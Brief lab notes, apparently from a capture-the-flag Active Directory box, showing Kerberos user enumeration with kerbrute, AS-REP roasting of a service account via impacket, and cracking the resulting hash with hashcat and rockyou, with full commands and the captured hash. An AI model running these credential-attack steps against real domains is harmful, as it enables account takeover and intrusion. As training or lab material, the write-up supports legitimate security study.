* After enumerating with NMAP, enumerate 139/445 more with `enum4linux`, kerberos with `kerbrute`


### Kerbrute
* Since we saw kerberos on `88`, hit the box with `kerbrute` to get some user enumeration.
	* `kerbrute userenum -d spookysec.local --dc spookysec.local ../assets/userlist.txt     ` shows that a service account  - `svc-admin@spookysec.local` - has been enumerated.
	![](Pasted%20image%2020220113225654.png)

* Steal the password hash from `svc-admin` with `GetNPusers` from `impacket`
	![](Pasted%20image%2020220113230757.png)

* Crack it with hashcat - gives us `management2005` as the password
	* `.\hashcat.exe -m 18200 -a 0 '$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:f4f90dacd662930d36bf5123e4b895ab$7e29b8ca975b2ab5c1702ec7d0be                                                                                                           e6fbc8063118129399e42d0f1fa22c4ad3c85e00521b38c38bfb4a828b520e5608fd54357fe232251ee61ed1184a74badcba4dd14fd30805d17a1ee862819eb032b4e                                                                                                           e0568d5da71780db4de5c364ec3cbcc1610974bdfa20e34a26576a3f7fd22d69a90e7601c3d91536d538c0d0d55ce82003d78a319f73191a15e517d22c4819a54fefc                                                                                                           c9a96810ef15863a9b60b1636635d9909e9501c7f6be76e44588a2ea37da3551bfa0ad94be7a2f849b5431335e7fe4e28a5c8a85592c4cacc850372f6fc46ab0518e3                                                                                                           3185bd598fbfb70534cd1696f7838cc6ffb27cd3c4d189df15c291a3cc42e' ..\rockyou.txt`
	* 